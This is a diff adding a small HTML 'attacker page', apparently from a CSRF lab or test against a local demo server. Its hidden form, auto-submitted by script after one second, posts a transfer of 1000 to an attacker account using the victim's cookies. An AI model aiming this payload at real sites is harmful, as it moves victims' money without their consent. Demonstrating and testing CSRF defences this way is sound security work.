@@ -1,0 +1,19 @@
+<!-- attacker.html -->
+<!doctype html>
+<html>
+  <head><meta charset="utf-8"><title>Attacker page</title></head>
+  <body>
+    <h1>Attacker page</h1>
+    <p>This page will auto-submit a form to the vulnerable site (using the victim's cookies).</p>
+
+    <form id="attack-fix" action="http://localhost:3001/transfer" method="POST">
+      <input type="hidden" name="to" value="attacker-fix-account">
+      <input type="hidden" name="amount" value="1000">
+    </form>
+
+    <script>
+      // Auto-submit after 1s to simulate a malicious CSRF attempt
+      setTimeout(()=>document.getElementById('attack-fix').submit(), 1000);
+    </script>
+  </body>
+</html>
